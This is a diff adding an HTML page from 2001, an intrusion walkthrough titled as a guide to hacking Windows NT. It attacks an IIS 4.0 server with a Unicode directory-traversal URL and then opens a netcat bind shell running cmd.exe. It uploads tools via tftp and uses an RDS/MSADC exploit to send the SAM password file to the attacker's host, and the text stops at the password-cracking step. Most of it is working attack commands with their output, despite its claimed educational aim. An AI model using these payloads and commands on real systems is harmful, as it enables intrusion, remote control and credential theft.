@@ -1,0 +1,725 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
+<HTML>
+<HEAD>
+	<META HTTP-EQUIV="CONTENT-TYPE" CONTENT="text/html; charset=iso-8859-1">
+	<TITLE>Britney's NT hack guide</TITLE>
+	<META NAME="GENERATOR" CONTENT="StarOffice/5.2 (Linux)">
+	<META NAME="AUTHOR" CONTENT="TSideboard">
+	<META NAME="CREATED" CONTENT="20010122;14360000">
+	<META NAME="CHANGEDBY" CONTENT="TSideboard">
+	<META NAME="CHANGED" CONTENT="20010123;17030000">
+	<STYLE>
+	<!--
+		@page { margin-right: 1.25in; margin-top: 1in; margin-bottom: 1in }
+		H1 { margin-top: 0in; margin-bottom: 0in; font-family: "Lucida Sans Unicode", sans-serif; font-size: 9pt; widows: 2; orphans: 2 }
+		H2 { margin-top: 0in; margin-bottom: 0in; font-family: "Lucida Sans Unicode", sans-serif; font-size: 8pt; widows: 2; orphans: 2 }
+		H3 { margin-top: 0in; margin-bottom: 0in; font-size: 10pt; widows: 2; orphans: 2 }
+		H4 { margin-top: 0in; margin-bottom: 0in; widows: 2; orphans: 2 }
+		A:link { color: #0000ff }
+		A:visited { color: #800080 }
+	-->
+	</STYLE>
+</HEAD>
+<BODY bgcolor="#333366" text="orange" LINK="orange" VLINK="orange">
+<P ALIGN=CENTER STYLE="margin-bottom: 0in"><FONT SIZE=4><B>Britney's
+Guide to Hacking NT in 5 Easy Steps</B></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">This paper is part of a series of
+educational pieces, to illuminate the importance of a secure
+environment on the Internet. Too often we hear or see &quot;solutions&quot;
+to the security problem, promising a silver bullet to stop hackers in
+their tracks. The scary part is, many IS managers take these promises
+as truth, and forget about security as soon as they have their
+firewall in place. Security is a work in progress, it is a job that
+is never done, an evolving ever changing landscape of problems, and
+it is easy to see why many people find the task so daunting, that it
+is swept under the carpet. It is an expensive and time consuming job,
+and never easy to accomplish, but I believe these problems need to be
+brought to light and dealt with.</P>
+<P STYLE="margin-bottom: 0in">In order to keep up with security
+needs, the latest exploits have to be tracked, systems patched, the
+network constantly monitored, and tested. New exploits appear daily,
+allowing script kiddies, as they are called, easy and complete access
+over your system, which may contain valuable or sensitive personal or
+financial data.</P>
+<P STYLE="margin-bottom: 0in">This paper focusses on breaking into an
+up to date standard install of  a Windows NT web server, however
+these types of problems and solutions aren't limited to Microsoft
+platforms, and have to be followed for all such systems in use.
+<B><FONT SIZE=1 STYLE="font-size: 6pt">Although NT does have way more
+security holes than any other OS.</FONT></B></P>
+<P STYLE="margin-bottom: 0in">The system itself has been taken from a
+production environment, where it had been in use as a backup box. The
+only change I made on it was to install IIS, with all default 
+settings.</P>
+<P STYLE="margin-bottom: 0in">The system is running Windows NT 4.0
+Server with Service Pack 6.0 and IIS Server version 4.0, on Dell
+Optiplex GXa  hardware. It is protected behind a firewall running
+OpenBSD and the only ports open are 22 (ssh), 80(http), and
+443(secure http), which is standard setup for an Internet connected
+web server.</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><B>Step #1 - Enumeration of target
+system.</B></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">The first step in any intrusion
+testing, is to enumerate the host system, finding out which OS is
+running, which versions, and what other services might be open. In
+our demonstration here, this step is mostly redundant, as we know
+from the beginning what our target system is. However, just to be
+complete and to introduce some of our tools, we can do a quick walk
+through.</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">NMAP by Fyoder -
+<FONT COLOR="#0000ff"><U><A HREF="http://www.insecure.org/nmap/index.html">www.insecure.org/nmap/index.html</A></U></FONT></P>
+<P STYLE="margin-bottom: 0in">Is the de facto port scanner tool for
+*nix systems. It can be used to scan large networks, as easily as
+single hosts. It has numerous options, depending on what kind of
+optimization you are looking for, whether it be speed, stealth, using
+other networking protocols, timing. A port scanner basically connects
+to every port on a given system, or whatever ports you specify, and
+finds out what services are being offered by that system. Nmap also
+can do OS fingerprinting, and TCP sequence predicting ( for session
+hijacking).</P>
+<P STYLE="margin-bottom: 0in; page-break-before: always"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Lets look at some nmap output so you
+can see what I mean:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>[root@gundam
+/root]# nmap -O 192.168.1.2</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Starting
+nmap V. 2.30BETA17 by fyodor@insecure.org ( www.insecure.org/nmap/ )</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Interesting
+ports on ntkrkr (192.168.1.2):</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>(Ports
+scanned but not shown below are in state: filtered)</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Port
+      State       Service</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>22/tcp
+    unfiltered  ssh</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>80/tcp
+    open        http</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>443/tcp
+   open        https</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>TCP
+Sequence Prediction: Class=trivial time dependency</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>
+                        Difficulty=4 (Trivial joke)</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Remote
+operating system guess: Windows NT4 / Win95 / Win98</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Nmap
+run completed -- 1 IP address (1 host up) scanned in 172 seconds</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"> 
+</P>
+<P STYLE="margin-bottom: 0in">The '-O' is for the OS fingerprinting.</P>
+<P STYLE="margin-bottom: 0in">From here, we know its at least a
+Windows box, and we can see that it is running a web server on port
+80.</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Netcat can give us a bit more
+information. Basically Netcat is a little utility for reading and
+writing raw network packets. It is very flexible in what it can do. It
+can be a client or a server, and like many Unix utilities, it's real
+strength comes, when combined with other commands. That all sounds
+kinda abstract, but you'll soon see what I mean. Using netcat as a
+client, when can connect to the IIS web server's port, hit return a
+few times, and Netcat will just pipe back the raw headers it gets:</P>
+<P STYLE="margin-bottom: 0in"> 
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>[root@gundam
+/root]# nc -vv 192.168.1.2 80</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>ntkrkr
+[192.168.1.2] 80 (www) open</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>HTTP/1.1
+400 Bad Request</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Server:
+Microsoft-IIS/4.0</B></FONT></FONT></P>
+<H1><FONT SIZE=1 STYLE="font-size: 8pt">Date: Thu, 18 Jan 2001
+23:23:22 GMT</FONT></H1>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Content-Type:
+text/html</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Content-Length:
+87</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>&lt;html&gt;&lt;head&gt;&lt;title&gt;Error&lt;/title&gt;&lt;/head&gt;&lt;body&gt;The
+parameter is incorrect. &lt;/body&gt;&lt;/html&gt; sent 2, rcvd 224</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">So now we know its an IIS/4.0 server,
+and I believe that IIS doesn't run on win9x systems, but would
+instead be MS Personal Web Services or something, so we also know we
+are up against an NT box.</P>
+<P STYLE="margin-bottom: 0in; page-break-before: always">Now we have
+some info on what we are up against.</P>
+<P STYLE="margin-bottom: 0in">So we look up some security sites, to
+find out what exploits we can run against IIS servers. Oooo, turns
+out there are many. Aren't you excited!?</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><B>Exploit #1 -- Directory Traversal
+using Unicode encoding.</B></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Full details and exploit code for this
+can be found at:</P>
+<P STYLE="margin-bottom: 0in"><FONT COLOR="#0000ff"><U><A HREF="http://www.securityfocus.com/frames/?content=/vdb/bottom.html%3Fvid%3D1806">http://www.securityfocus.com/frames/?content=/vdb/bottom.html%3Fvid%3D1806</A></U></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">One of the hottest exploits at the
+moment, is a new twist on the old directory  traversal trick. To
+explain a little more: Like FTP, a Web Server runs in a chroot'ed
+directory, meaning that the web server, and its users shouldn't be
+able to access the rest of the filesystem outside of the www
+publishing area. The web server however has to have certain rights in
+order to perform its job, such as running executable scripts. The way
+it is setup is that you can only execute scripts from predefined
+directories. On the real filesystem this directory could be
+c:\Inetpub\scripts on a windows box.</P>
+<P STYLE="margin-bottom: 0in">So picture the directory tree, partly
+it would look like</P>
+<pre>
+C:\ ---
+      |-- InetPub/
+      |         |- wwwroot/
+      |         |         |- scripts/</P>
+      |
+      |-- winnt/ 
+      |        |- system32/</P>
+
+</pre>
+<P STYLE="margin-bottom: 0in">So we have rights to run programs in
+/Inetpub/scripts/ but really the interesting programs that we can
+exploit all live in /winnt/system32.</P>
+<P STYLE="margin-bottom: 0in">The way round about this is to use
+relative paths, so that from the scripts directory we could type:</P>
+<P STYLE="margin-bottom: 0in">'../../winnt/system32/cmd.exe'. This is
+a legal move for the computer, it is still only executing something
+from within the allowed directory, but its calling a program from a 
+different location. IIS looks out for this when it parses a URL
+request, and will deny such a call. 
+</P>
+<P STYLE="margin-bottom: 0in; page-break-before: always">The way to
+beat this, is by encoding those backslashes as Unicode, such that
+with a URL like:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT COLOR="#0000ff"><U><A HREF="http://192.168.1.2/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir">http://192.168.1.2/scripts/..%c1%pc../winnt/system32/cmd.exe?/c+dir</A></U></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">we get:</P>
+<P STYLE="margin-bottom: 0in"><IMG SRC="sv15715793.jpg" NAME="Graphic1" ALIGN=BOTTOM WIDTH=576 HEIGHT=268 BORDER=0></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Voila! We can now run arbitrary system
+commands. Our caveat is that we have the effective user idea of the
+web server, INET_MACHINENAME, which has very little priveleges to do
+anything. And also, it's kinda cumbersome to work via the web
+browser.</P>
+<P STYLE="margin-bottom: 0in">Ok, now a quick search on the net for
+this exploit and I find a perl script that opens a network socket and
+sends your same commands to the webserver. Its basically doing what
+your broswer does, but it's a little easier to work with.</P>
+<P STYLE="margin-bottom: 0in">Hence:</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>[root@gundam
+nthack]# perl -x unicodexecute.pl 192.168.1.2:80 'dir'</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Executing
+dir on 192.168.1.2:80</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>HTTP/1.1
+200 OK</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Server:
+Microsoft-IIS/4.0</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Date:
+Fri, 19 Jan 2001 00:15:26 GMT</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Content-Type:
+application/octet-stream</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Volume
+in drive D has no label.</B></FONT></FONT></P>
+<H2>Volume Serial Number is F465-557F</H2>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>
+Directory of D:\Inetpub\scripts</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>01/18/01
+ 03:15p        &lt;DIR&gt;          .</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>01/18/01
+ 03:15p        &lt;DIR&gt;          ..</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>
+              2 File(s)              0 bytes</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>
+                            28,081,664 bytes free</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in; page-break-before: always"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Much nicer way to work. Ok, so what can
+we do here next? A command shell on the system would be nice, huh? On
+NT I hear you ask, a remote shell? Don't believe you!</P>
+<P STYLE="margin-bottom: 0in">Well, our little Swiss Army Knife of
+the Software World, netcat can do magical things, let me show you:</P>
+<P STYLE="margin-bottom: 0in">So first, we gotta get netcat onto the
+NT system. First thing we do is upload it via tftp.</P>
+<P STYLE="margin-bottom: 0in">We set up a tftp server on our own
+system so we can transfer the files over. TFTP is the Trivial File
+Transfer Protocol, and contain no authentication whatsoever, but its
+an easy way to get the files over.</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>[root@gundam
+nthack]# perl -x unicodexecute.pl 192.168.1.2:80 'tftp -i
+172.16.41.71 GET nc.exe'</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Executing
+tftp -i 172.16.41.71 GET nc.exe on 192.168.1.2:80</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>HTTP/1.1
+502 Gateway Error</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Server:
+Microsoft-IIS/4.0</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Date:
+Fri, 19 Jan 2001 00:19:34 GMT</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Content-Length:
+215</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Content-Type:
+text/html</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>&lt;head&gt;&lt;title&gt;Error
+in CGI Application&lt;/title&gt;&lt;/head&gt;</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>&lt;body&gt;&lt;h1&gt;CGI
+Error&lt;/h1&gt;The specified CGI application misbehaved by not
+returning </B></FONT></FONT>
+</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">We can see it got there ok:</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>[root@gundam
+nthack]# perl -x unicodexecute.pl 192.168.1.2:80 'dir'</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Executing
+dir on 192.168.1.2:80</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>
+Directory of D:\Inetpub\scripts</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>01/18/01
+ 04:19p        &lt;DIR&gt;          .</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>01/18/01
+ 04:19p        &lt;DIR&gt;          ..</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>01/18/01
+ 04:19p                59,392 nc.exe</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>
+              3 File(s)         59,392 bytes</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>
+                            28,022,272 bytes free</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Next we start up netcat:</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>[root@gundam
+nthack]# perl -x unicodexecute.pl 192.168.1.2:80 'nc -L -p443 -d -e
+cmd.exe'</B></FONT></FONT></P>
+<H2>Executing nc -L -p23 -d -e cmd.exe on 192.168.1.2:80</H2>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">We don't get our command prompt back,
+so we know something is happening.</P>
+<P STYLE="margin-bottom: 0in">Basically what I've told netcat to do
+is to be a server, and listen on port 443. We use 443 because it is
+aloowed through the firewall. The '-d' means go into stealth mode,
+and the '-e cmd.exe' means execute this command when someone
+connects, so basically it shovels the remote cmd.exe over the network
+to your netcat client:</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>[root@gundam
+/root]# nc 192.168.1.2 443</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Microsoft(R)
+Windows NT(TM)</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>(C)
+Copyright 1985-1996 Microsoft Corp.</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>D:\Inetpub\scripts&gt;whoami</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>whoami</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>NTKRKR\IUSR_NTKRKR</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>D:\Inetpub\scripts&gt;</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in; page-break-before: always"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Note the Windows prompt now!
+Sweee-eeeet! And also note our user id.</P>
+<P STYLE="margin-bottom: 0in">So from here, how do we get
+administrator priveleges?</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><B>Exploit # 2 -- Microsoft Data Access
+Components.</B></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Full details at:</P>
+<P STYLE="margin-bottom: 0in"><FONT COLOR="#0000ff"><U><A HREF="http://www.wwdsi.com/demo/advisories/rfp9907.html">http://www.wwdsi.com/demo/advisories/rfp9907.html</A></U></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Aww, now this one is exceptionally
+nice.</P>
+<P STYLE="margin-bottom: 0in">MDAC is a way for the web server to
+access any ODBC compliant database. 
+</P>
+<P STYLE="margin-bottom: 0in">Forgive the acronymns here, but just
+follow along for a second.</P>
+<P STYLE="margin-bottom: 0in">A default install of IIS4.0 includes
+MDAC, and MDAC, includes a component called RDS, Remote Data
+Services. This is the part that actually allows for remote access to
+ODBC over the web.</P>
+<P STYLE="margin-bottom: 0in">MS Access handles these requests via
+it's database engine called Jet. The problem is that Jet allows calls
+to VBA's shell function, allowing you to  to run shell commands with
+System Level permissions. Sounds like what we are looking for!</P>
+<P STYLE="margin-bottom: 0in">Now how exactly should we use this
+capability?</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">One thing that would be nice is a copy
+of the SAM, which is Windows Security Accounts Manager, an encrypted
+database containing all the user Ids and passwords. The SAM is locked
+by the OS during normal operation, and cannot be accessed even by
+Administrator. However, when  an emergency repair disk is created,
+and the '/s' is used in the creation, a compressed copy of the same
+is stored on the drive itself in the winnt/repair/ directory. This
+should always be carefully deleted afterwards.</P>
+<P STYLE="margin-bottom: 0in">On this system, without me having put
+it there, sitting there in all it's glory was my file, 'sam._'. 
+</P>
+<P STYLE="margin-bottom: 0in">Now as my current user ID, IUSER_NTKRKR
+I cannot touch the file. I cannot copy, move it or read it.</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>D:\Inetpub\scripts&gt;copy
+\winnt\repair\sam._</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>copy
+\winnt\repair\sam._</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Access
+is denied.</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>
+       0 file(s) copied.</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">So lets try our new little MDAC script
+and see what we can do:</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>[root@gundam
+nthack]# perl -x msadc1.pl -h 192.168.1.2</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>--
+RDS exploit by rain forest puppy / ADM / Wiretrip --</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Please
+type the NT commandline you want to run (cmd /c assumed):</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>cmd
+/c tftp -i 172.16.41.71 PUT \winnt\repair\sam._</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>Step
+1: Trying raw driver to btcustmr.mdb</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>winnt
+-&gt; c: d: Success!</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>[root@gundam
+nthack]# ls -la /tftpboot/sam._</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in"><FONT FACE="Lucida Sans Unicode, sans-serif"><FONT SIZE=1 STYLE="font-size: 8pt"><B>-rw-rw-rw-
+   1 thorsten thorsten     3119 Jan 18 17:33 /tftpboot/sam._</B></FONT></FONT></P>
+<P STYLE="margin-bottom: 0in; page-break-before: always"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><B>Exploit #3 -- Password Crackers.</B></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in"><FONT COLOR="#0000ff"><U><A HREF="http://www.l0pht.com/">www.l0pht.com</A></U></FONT></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
+<P STYLE="margin-bottom: 0in">Success! Now I can transfer it over to
+my Windows box and run  it through the defacto Windows password
+cruncher, L0phtCrack:</P>
+<P STYLE="margin-bottom: 0in"><IMG SRC="sv15715795.jpg" NAME="Graphic2" ALIGN=BOTTOM WIDTH=575 HEIGHT=191 BORDER=0></P>
+<P STYLE="margin-bottom: 0in"><BR>
+</P>
